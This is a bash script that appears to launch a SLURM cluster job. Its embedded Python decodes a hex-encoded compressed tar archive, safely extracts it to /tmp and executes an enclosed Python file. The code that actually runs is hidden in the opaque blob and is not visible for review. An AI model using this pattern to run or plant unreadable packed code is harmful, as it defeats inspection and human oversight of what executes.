#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95cf6fdb2014c77bf65f8172c1962202feed5439eebec3b6cb545518e38434c11690b5d9b4ff7d604755a64abbb5ddb4f739188379dff778f030257b3be89b57857a4a4aa796be6c6996e5cfeff3785995d50da2af1bd6ccc93a6ebccbb7f0f517f263e18607a9176bb4e02d656996176555378b255a8cfc7c1878776f773c2dca30a36b3a591705abcb3cedb3aa48eb366382d3ace33967a548d32a4dd38cb2a2aaf2b6e05eabad682f194dab4eb4ec5ab53d3b69bd6891d529abaaf0e5c0f59533514859a54dc3fabaa07d99175c08e9076bea3dd4acef4453b1a229bad6c7c27d1465d679d34654196d8ba659fc7cefdcfe0b50329e5fddc79feb9f31f6a2fef33c83fa7f0bd4711c8c43f66c97e147b0dc71bb3ba876e993d2ab838c7a331cd1c85d184497c91f7d37329bd0c4de9070b3fdf695dd25b762133448a86f1bc76685e9f477c10931d297bc934f2e4e9288cfa678359a612f855b89e1783c69e5ceabfdfe2c4f7a8b9395f88aa79b09df0519b7fd8e236eadf4ee2f2192f9aa88f92c3edd275e9dece453a7b6d27a579b8d57f9fd1ac377d1a3723b74591f1946a9639e206e915b47a81f0c9248e9a983548ff4e090249a1f250907c5d9601de3c1881d37ddfd8ed1154ed662d04ee993bcb65136388813e425312138a84eeb9ee5123206b9b5e1ca4af4851f4ef283318389f1676d791f82184f0e275e72dcf8548e78351bde8ec1526a478e0f9d32f1dcb19b4fe62497f24959773f3c4cbdc44f7d34cac94b721cf11b60b870536072de95b0216113c31e13a5438663bab4cec49353ff753a02570b26fbe1f9281cb9d25178c42689defb2c03000000000000000000000000000000000000000000c0ffca2f9e10f0f400280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
